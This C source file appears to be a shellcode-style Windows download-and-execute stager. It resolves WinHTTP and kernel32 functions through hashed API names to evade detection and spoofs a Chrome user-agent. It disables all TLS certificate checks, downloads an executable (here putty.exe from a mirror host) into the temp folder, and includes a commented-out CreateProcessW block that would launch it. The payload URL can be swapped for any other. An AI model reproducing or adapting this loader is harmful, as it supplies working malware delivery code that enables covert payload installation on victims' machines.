#include "winapi_loader.h"
#include <winhttp.h>

// -------------------- Function pointer types --------------------
typedef HINTERNET (WINAPI *WinHttpOpen_t)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET (WINAPI *WinHttpConnect_t)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
typedef HINTERNET (WINAPI *WinHttpOpenRequest_t)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
typedef BOOL (WINAPI *WinHttpSendRequest_t)(HINTERNET, LPCWSTR, DWORD,LPVOID, DWORD, DWORD, DWORD_PTR);
typedef BOOL (WINAPI *WinHttpReceiveResponse_t)(HINTERNET, LPVOID);
typedef BOOL (WINAPI *WinHttpSetOption_t)(HINTERNET, DWORD, LPVOID, DWORD);
typedef BOOL (WINAPI *WinHttpReadData_t)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL (WINAPI *WinHttpCloseHandle_t)(HINTERNET);
typedef DWORD (WINAPI *GetTempPathW_t)(DWORD, LPWSTR);
typedef HANDLE (WINAPI *CreateFileW_t)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL (WINAPI *WriteFile_t)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL (WINAPI *CreateProcessW_t)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
typedef BOOL (WINAPI *CloseHandle_t)(HANDLE);
typedef BOOL (WINAPI *ExitProcess_t)(UINT);

// -------------------- Strings --------------------
#define kernel32_dll HASH("kernel32.dll")

#define winhttpopen HASH("WinHttpOpen")
#define winhttpconnect HASH("WinHttpConnect")
#define winhttpopenrequest HASH("WinHttpOpenRequest")
#define winhttpsendrequest HASH("WinHttpSendRequest")
#define winhttpreceiveresponse HASH("WinHttpReceiveResponse")
#define winhttpsetoption HASH("WinHttpSetOption")
#define winhttpreaddata HASH("WinHttpReadData")
#define winhttpclosehandle HASH("WinHttpCloseHandle")

#define gettemppathw HASH("GetTempPathW")
#define createfilew HASH("CreateFileW")
#define writefile HASH("WriteFile")
#define createprocessw HASH("CreateProcessW")
#define closehandle HASH("CloseHandle")
#define exitprocess HASH("ExitProcess")

STRINGW(winhttp_dll, "winhttp.dll")
STRINGW(agent, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36")
STRINGW(get, "GET")
STRINGW(host, "meetings-archive.debian.net")
STRINGW(path, "/pub/putty/putty-website-mirror/0.83/w64/putty.exe")
STRINGA(outfile, "PuTTY.exe")

// -------------------- Entry point --------------------
__attribute__((section(".text.start")))
int _start(void)
{
    HMODULE hWinhttp = myLoadLibraryW(winhttp_dll);
    HMODULE hKernel32 = myGetModuleHandleH(kernel32_dll);

    WinHttpOpen_t WinHttpOpen = (WinHttpOpen_t)myGetProcAddressH(hWinhttp, winhttpopen);
    WinHttpConnect_t WinHttpConnect = (WinHttpConnect_t)myGetProcAddressH(hWinhttp, winhttpconnect);
    WinHttpOpenRequest_t WinHttpOpenRequest = (WinHttpOpenRequest_t)myGetProcAddressH(hWinhttp, winhttpopenrequest);
    WinHttpSendRequest_t WinHttpSendRequest = (WinHttpSendRequest_t)myGetProcAddressH(hWinhttp, winhttpsendrequest);
    WinHttpReceiveResponse_t WinHttpReceiveResponse = (WinHttpReceiveResponse_t)myGetProcAddressH(hWinhttp, winhttpreceiveresponse);
    WinHttpSetOption_t WinHttpSetOption = (WinHttpSetOption_t)myGetProcAddressH(hWinhttp, winhttpsetoption);
    WinHttpReadData_t WinHttpReadData = (WinHttpReadData_t)myGetProcAddressH(hWinhttp, winhttpreaddata);
    WinHttpCloseHandle_t WinHttpCloseHandle = (WinHttpCloseHandle_t)myGetProcAddressH(hWinhttp, winhttpclosehandle);
    GetTempPathW_t GetTempPathW = (GetTempPathW_t)myGetProcAddressH(hKernel32, gettemppathw);
    CreateFileW_t CreateFileW = (CreateFileW_t)myGetProcAddressH(hKernel32, createfilew);
    WriteFile_t WriteFile = (WriteFile_t)myGetProcAddressH(hKernel32, writefile);
    CreateProcessW_t CreateProcessW = (CreateProcessW_t)myGetProcAddressH(hKernel32, createprocessw);
    CloseHandle_t CloseHandle = (CloseHandle_t)myGetProcAddressH(hKernel32, closehandle);
    ExitProcess_t ExitProcess = (ExitProcess_t)myGetProcAddressH(hKernel32, exitprocess);

    // -------------------- WinHTTP download --------------------
    HINTERNET hSession = WinHttpOpen(agent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, host, INTERNET_DEFAULT_HTTPS_PORT, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, get, path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

    DWORD protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2; // W7 compatibility

    WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &protocols, sizeof(protocols));

    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA  |
            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
            SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    WinHttpReceiveResponse(hRequest, NULL);

    WCHAR fullPath[MAX_PATH];
    
	// save file to temp
    DWORD len = GetTempPathW(MAX_PATH, fullPath);
    
    int i = (int)len;
    int j = 0;
    
    while (outfile[j]) {
        fullPath[i++] = outfile[j++];
    }
    
    fullPath[i] = 0;
    
    HANDLE file = CreateFileW(fullPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    BYTE buffer[8192];
    DWORD read = 0;

    while (WinHttpReadData(hRequest, buffer, sizeof(buffer), &read) && read)
    {
        DWORD written;
        WriteFile(file, buffer, read, &written, NULL);
    }

    CloseHandle(file);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

/*
    // -------------------- Execute downloaded file --------------------
	STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    CreateProcessW(fullPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
*/
    ExitProcess(0);
}
